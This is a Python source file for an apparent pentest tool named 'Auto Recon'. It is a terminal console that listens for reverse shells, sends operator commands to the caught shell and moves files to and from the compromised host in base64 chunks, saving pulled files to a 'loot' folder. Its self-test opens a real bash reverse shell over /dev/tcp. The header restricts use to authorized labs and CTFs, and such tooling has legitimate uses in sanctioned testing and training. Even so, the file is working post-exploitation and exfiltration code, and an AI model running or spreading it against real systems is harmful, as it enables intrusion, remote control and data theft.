#!/usr/bin/env python3
# ============================================================================
# AUTO RECON - Reverse Shell + File Transfer TUI (Textual)
# ----------------------------------------------------------------------------
# Two-panel operator console:
#   LEFT  panel  -> live reverse-shell session (connected target + I/O stream)
#   RIGHT panel  -> file transfer:  Upload to target  /  Download from target
#
# Keyboard:  Tab / Shift-Tab move focus between fields & panels, Enter sends a
# shell command or submits a field, buttons execute transfers, F1/F2 jump
# between the session and the transfer pane, Ctrl-C / q quits.
#
# File transfer rides *inside* the caught shell (base64 over the same socket),
# so it needs no second listener and works against a plain `nc` / bash shell.
#
# Library: Textual (https://textual.textualize.io) for the UI; the transfer
# engine below is pure stdlib so it can be unit-tested headlessly (--self-test).
#
# Authorized lab / CTF / OSCP-style pentest use only.
# ============================================================================
import argparse
import asyncio
import base64
import os
import re
import secrets
import sys


# ── Helpers ─────────────────────────────────────────────────────────────────
def shq(path: str) -> str:
    """Single-quote a string safely for a POSIX shell command line."""
    return "'" + path.replace("'", "'\\''") + "'"


def human_size(n: int) -> str:
    f = float(n)
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if f < 1024 or unit == "TB":
            return f"{int(f)}{unit}" if unit == "B" else f"{f:.1f}{unit}"
        f /= 1024
    return f"{n}B"


# ── Transfer engine (no Textual dependency) ─────────────────────────────────
class ReverseShellEngine:
    """
    Owns the TCP listener + the single caught shell connection, pumps shell
    output to a callback, and implements base64 file transfer *through* the
    shell using unique start/end sentinels to frame captured output.
    """

    def __init__(self, host="0.0.0.0", port=4444, log_cb=None):
        self.host = host
        self.port = port
        self.log_cb = log_cb                # called with str chunks of shell output
        self.on_connect_cb = None           # called with "ip:port" on connect
        self.server = None
        self.reader = None
        self.writer = None
        self.peer = None
        self.connected = asyncio.Event()

        # capture state (one framed transfer at a time)
        self._cap_active = False
        self._cap_buf = ""
        self._cap_start = ""
        self._cap_end = ""
        self._cap_future = None
        self._pump_task = None

    # -- listener ------------------------------------------------------------
    async def start(self):
        self.server = await asyncio.start_server(self._handle, self.host, self.port)

    async def _handle(self, reader, writer):
        if self.writer is not None:
            writer.close()             # already have a shell; ignore extras
            return
        self.reader = reader
        self.writer = writer
        peer = writer.get_extra_info("peername")
        self.peer = f"{peer[0]}:{peer[1]}" if peer else "unknown"
        self.connected.set()
        if self.on_connect_cb:
            self.on_connect_cb(self.peer)
        self._pump_task = asyncio.create_task(self._pump())

    async def _pump(self):
        while True:
            try:
                data = await self.reader.read(65536)
            except (ConnectionResetError, asyncio.CancelledError):
                break
            if not data:
                break
            text = data.decode("utf-8", "replace")
            if self._cap_active:
                self._cap_buf += text
                self._try_resolve_capture()
                if not self._cap_active and self._cap_buf:
                    if self.log_cb:            # trailing bytes after sentinel
                        self.log_cb(self._cap_buf)
                    self._cap_buf = ""
            elif self.log_cb:
                self.log_cb(text)
        self.writer = None
        self.reader = None
        self.connected.clear()
        if self.log_cb:
            self.log_cb("\n[*] target disconnected\n")

    def _try_resolve_capture(self):
        m = re.search(
            re.escape(self._cap_start) + r"\r?\n(.*?)\r?\n?" + re.escape(self._cap_end),
            self._cap_buf,
            re.DOTALL,
        )
        if not m:
            return
        payload = m.group(1)
        self._cap_buf = self._cap_buf[m.end():]     # keep post-sentinel bytes
        self._cap_active = False
        if self._cap_future and not self._cap_future.done():
            self._cap_future.set_result(payload)

    # -- raw shell I/O -------------------------------------------------------
    def is_connected(self) -> bool:
        return self.writer is not None

    async def send_command(self, cmd: str):
        if not self.is_connected():
            raise RuntimeError("no shell connected")
        self.writer.write((cmd + "\n").encode())
        await self.writer.drain()

    async def _run_capture(self, cmd: str, timeout: float = 30.0) -> str:
        """Send `cmd` and return the text framed by fresh sentinels."""
        if not self.is_connected():
            raise RuntimeError("no shell connected")
        tag = secrets.token_hex(6)
        self._cap_start = f"__AR_S_{tag}__"
        self._cap_end = f"__AR_E_{tag}__"
        self._cap_buf = ""
        self._cap_future = asyncio.get_event_loop().create_future()
        self._cap_active = True
        framed = f"echo {self._cap_start}; {cmd}; echo {self._cap_end}"
        await self.send_command(framed)
        try:
            return await asyncio.wait_for(self._cap_future, timeout)
        except asyncio.TimeoutError:
            self._cap_active = False
            raise RuntimeError("timed out waiting for shell response")

    # -- file transfer -------------------------------------------------------
    async def upload(self, local_path, remote_path, progress_cb=None, chunk=1024):
        """Send a local file to the target (local -> remote) via base64."""
        if not os.path.isfile(local_path):
            return False, f"local file not found: {local_path}"
        with open(local_path, "rb") as fh:
            data = fh.read()
        size = len(data)
        b64 = base64.b64encode(data).decode()
        rp = shq(remote_path)
        tmp = shq(remote_path + f".ar_{secrets.token_hex(3)}")

        await self.send_command(f"cat /dev/null > {tmp}")
        total = max(1, (len(b64) + chunk - 1) // chunk)
        sent = 0
        for i in range(0, len(b64), chunk):
            part = b64[i:i + chunk]
            await self.send_command(f"printf %s {shq(part)} >> {tmp}")
            sent += 1
            if progress_cb:
                progress_cb(sent, total)
            if sent % 16 == 0:
                await asyncio.sleep(0)     # let the socket buffer drain

        out = await self._run_capture(
            f"base64 -d {tmp} > {rp} 2>/dev/null && wc -c < {rp}; rm -f {tmp}",
            timeout=60,
        )
        got = "".join(ch for ch in out if ch.isdigit())
        if got and int(got) == size:
            return True, f"uploaded {human_size(size)} → {remote_path}"
        if got:
            return False, f"size mismatch: sent {size}B, target has {got}B"
        return False, "upload failed (no size returned — check remote path/perms)"

    async def download(self, remote_path, local_path, progress_cb=None):
        """Pull a remote file to the attacker box (remote -> local) via base64."""
        rp = shq(remote_path)
        if progress_cb:
            progress_cb(1, 3)
        out = await self._run_capture(
            f"base64 -w0 {rp} 2>/dev/null || base64 {rp} 2>/dev/null",
            timeout=60,
        )
        b64 = re.sub(r"\s+", "", out)
        if not b64:
            return False, "nothing returned (missing file / no read perms / no base64 on target)"
        if progress_cb:
            progress_cb(2, 3)
        try:
            raw = base64.b64decode(b64)
        except Exception as e:  # noqa: BLE001
            return False, f"decode error: {e}"
        os.makedirs(os.path.dirname(os.path.abspath(local_path)) or ".", exist_ok=True)
        with open(local_path, "wb") as fh:
            fh.write(raw)
        if progress_cb:
            progress_cb(3, 3)
        return True, f"downloaded {human_size(len(raw))} → {local_path}"


# ── Textual UI ──────────────────────────────────────────────────────────────
def build_app(engine, loot_dir):
    try:
        from textual.app import App, ComposeResult
        from textual.containers import Vertical, VerticalScroll
        from textual.widgets import (
            Button, Footer, Header, Input, ProgressBar, RichLog, Rule, Static,
        )
    except Exception:  # noqa: BLE001 — textual not installed
        return None

    class ShellTUI(App):
        CSS = """
        Screen { layout: horizontal; }
        #session { width: 62%; border: round $accent; padding: 0 1; }
        #transfer { width: 38%; border: round $secondary; padding: 0 1; }
        #shelllog { height: 1fr; border: round $panel; background: $surface; }
        #cmd { dock: bottom; }
        .sect { color: $accent; text-style: bold; padding: 1 0 0 0; }
        #status { height: auto; min-height: 3; border: round $panel; padding: 0 1; }
        Input { margin: 0 0 1 0; }
        Button { width: 100%; margin: 0 0 1 0; }
        """
        BINDINGS = [
            ("f1", "focus_session", "Session"),
            ("f2", "focus_transfer", "Transfer"),
            ("ctrl+l", "clear_log", "Clear log"),
            ("ctrl+q", "quit", "Quit"),
        ]

        def __init__(self):
            super().__init__()
            self.engine = engine
            self.loot_dir = loot_dir

        def compose(self) -> ComposeResult:
            yield Header(show_clock=True)
            with Vertical(id="session"):
                yield Static("● Reverse Shell Session", classes="sect")
                yield Static("Listener: starting…  Target: (waiting)", id="sess_status")
                yield RichLog(id="shelllog", highlight=False, markup=False, wrap=True)
                yield Input(placeholder="shell command…  (Enter to send)", id="cmd")
            with VerticalScroll(id="transfer"):
                yield Static("▲ Upload to target", classes="sect")
                yield Input(placeholder="local file path", id="up_local")
                yield Input(placeholder="remote destination (e.g. /tmp/x)", id="up_remote")
                yield Button("Upload → target", id="btn_up", variant="primary")
                yield Rule()
                yield Static("▼ Download from target", classes="sect")
                yield Input(placeholder="remote file path (e.g. /etc/passwd)", id="dl_remote")
                yield Input(placeholder="save as (blank = loot dir)", id="dl_local")
                yield Button("Download ← target", id="btn_dl", variant="success")
                yield Rule()
                yield Static("Status", classes="sect")
                yield Static("idle", id="status")
                yield ProgressBar(id="progress", total=100, show_eta=False)
            yield Footer()

        # -- lifecycle -------------------------------------------------------
        async def on_mount(self):
            self.title = "Auto Recon — Shell Handler"
            self.sub_title = f"{self.engine.host}:{self.engine.port}"
            self.engine.log_cb = self._log_shell
            self.engine.on_connect_cb = self._on_connect
            self.query_one("#cmd", Input).focus()
            try:
                await self.engine.start()
                self._sess_status(
                    f"Listener: {self.engine.host}:{self.engine.port} ✓  "
                    "Target: (waiting for connection)"
                )
                self._status("listening — run a reverse-shell payload on the target", "warn")
            except OSError as e:
                self._sess_status(f"Listener FAILED on {self.engine.host}:{self.engine.port} — {e}")
                self._status(f"cannot bind {self.engine.port}: {e}", "err")

        # -- helpers ---------------------------------------------------------
        def _log_shell(self, text):
            self.query_one("#shelllog", RichLog).write(text)

        def _sess_status(self, text):
            self.query_one("#sess_status", Static).update(text)

        def _on_connect(self, peer):
            self._sess_status(
                f"Listener: {self.engine.host}:{self.engine.port} ✓  "
                f"Target: {peer}  ● CONNECTED"
            )
            self._status(f"shell from {peer} — go!", "ok")
            self.bell()

        def _status(self, msg, kind="info"):
            color = {"ok": "green", "err": "red", "warn": "yellow", "info": "white"}.get(kind, "white")
            self.query_one("#status", Static).update(f"[{color}]{msg}[/{color}]")

        def _progress(self, done, total):
            self.query_one("#progress", ProgressBar).update(total=total, progress=done)

        def action_focus_session(self):
            self.query_one("#cmd", Input).focus()

        def action_focus_transfer(self):
            self.query_one("#up_local", Input).focus()

        def action_clear_log(self):
            self.query_one("#shelllog", RichLog).clear()

        # -- events ----------------------------------------------------------
        async def on_input_submitted(self, event):
            if event.input.id != "cmd":
                return
            cmd = event.value
            if not cmd:
                return
            if not self.engine.is_connected():
                self._status("no shell connected yet", "err")
                return
            self._log_shell(f"\n$ {cmd}\n")
            try:
                await self.engine.send_command(cmd)
            except Exception as e:  # noqa: BLE001
                self._status(f"send failed: {e}", "err")
            event.input.value = ""

        async def on_button_pressed(self, event):
            if not self.engine.is_connected():
                self._status("no shell connected yet", "err")
                return
            if event.button.id == "btn_up":
                await self._do_upload()
            elif event.button.id == "btn_dl":
                await self._do_download()

        async def _do_upload(self):
            local = self.query_one("#up_local", Input).value.strip()
            remote = self.query_one("#up_remote", Input).value.strip()
            if not local or not remote:
                self._status("upload needs a local path AND a remote destination", "err")
                return
            self._status(f"uploading {os.path.basename(local)} …", "warn")
            self._progress(0, 100)
            ok, msg = await self.engine.upload(local, remote, progress_cb=self._progress)
            if ok:
                self._progress(1, 1)
            self._status(msg, "ok" if ok else "err")

        async def _do_download(self):
            remote = self.query_one("#dl_remote", Input).value.strip()
            local = self.query_one("#dl_local", Input).value.strip()
            if not remote:
                self._status("download needs a remote file path", "err")
                return
            if not local:
                os.makedirs(self.loot_dir, exist_ok=True)
                local = os.path.join(self.loot_dir, os.path.basename(remote.rstrip("/")) or "loot.bin")
            self._status(f"downloading {os.path.basename(remote)} …", "warn")
            self._progress(0, 100)
            ok, msg = await self.engine.download(remote, local, progress_cb=self._progress)
            self._status(msg, "ok" if ok else "err")

    return ShellTUI()


# ── Headless self-test: drive a real loopback bash reverse shell ────────────
async def self_test() -> int:
    import subprocess
    import tempfile

    # pick a free port
    import socket
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()

    log = []
    engine = ReverseShellEngine("127.0.0.1", port, log_cb=lambda t: log.append(t))
    await engine.start()

    target = subprocess.Popen(
        ["bash", "-c", f"bash -i >& /dev/tcp/127.0.0.1/{port} 0>&1"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    try:
        await asyncio.wait_for(engine.connected.wait(), timeout=5)
    except asyncio.TimeoutError:
        print("SELF-TEST FAIL: mock target never connected")
        target.kill()
        return 1

    await asyncio.sleep(0.3)
    rc = 0
    workdir = tempfile.mkdtemp(prefix="ar_selftest_")
    try:
        # 1) UPLOAD: random local file -> remote temp path
        local_src = os.path.join(workdir, "payload.bin")
        remote_dst = os.path.join(workdir, "remote_copy.bin")
        blob = secrets.token_bytes(5000)
        with open(local_src, "wb") as fh:
            fh.write(blob)
        ok, msg = await engine.upload(local_src, remote_dst)
        print(f"[upload]   {ok}  {msg}")
        if not ok or open(remote_dst, "rb").read() != blob:
            print("SELF-TEST FAIL: uploaded bytes differ"); rc = 1

        # 2) DOWNLOAD: pull that remote file back -> compare
        local_back = os.path.join(workdir, "back.bin")
        ok, msg = await engine.download(remote_dst, local_back)
        print(f"[download] {ok}  {msg}")
        if not ok or open(local_back, "rb").read() != blob:
            print("SELF-TEST FAIL: downloaded bytes differ"); rc = 1

        # 3) live command capture sanity
        out = await engine._run_capture("id -un")
        print(f"[command]  id -un -> {out.strip()!r}")
        if not out.strip():
            print("SELF-TEST FAIL: no command output"); rc = 1
    finally:
        try:
            await engine.send_command("exit")
        except Exception:  # noqa: BLE001
            pass
        target.kill()

    print("SELF-TEST PASS" if rc == 0 else "SELF-TEST FAILED")
    return rc


def main():
    ap = argparse.ArgumentParser(description="Auto Recon reverse-shell + file-transfer TUI")
    ap.add_argument("--host", default="0.0.0.0", help="listen address (default 0.0.0.0)")
    ap.add_argument("--port", type=int, default=4444, help="listen port (default 4444)")
    ap.add_argument("--loot", default=os.path.join(os.getcwd(), "shells", "loot"),
                    help="directory for downloaded files")
    ap.add_argument("--self-test", action="store_true", help="headless engine test (no UI)")
    ap.add_argument("--check", action="store_true", help="report whether Textual is available")
    args = ap.parse_args()

    if args.check:
        try:
            import textual  # noqa: F401
            print("textual: available")
            return 0
        except Exception:  # noqa: BLE001
            print("textual: MISSING  (install: pipx install textual  ·  or: pip install --user textual)")
            return 2

    if args.self_test:
        return asyncio.run(self_test())

    os.makedirs(args.loot, exist_ok=True)
    engine = ReverseShellEngine(args.host, args.port)
    app = build_app(engine, args.loot)
    if app is None:
        sys.stderr.write(
            "Textual is not installed.\n"
            "  Install:  pipx install textual   (or)   pip install --user textual\n"
            "  Verify :  python3 modules/shell_tui.py --check\n"
        )
        return 2
    app.run()
    return 0


if __name__ == "__main__":
    sys.exit(main())
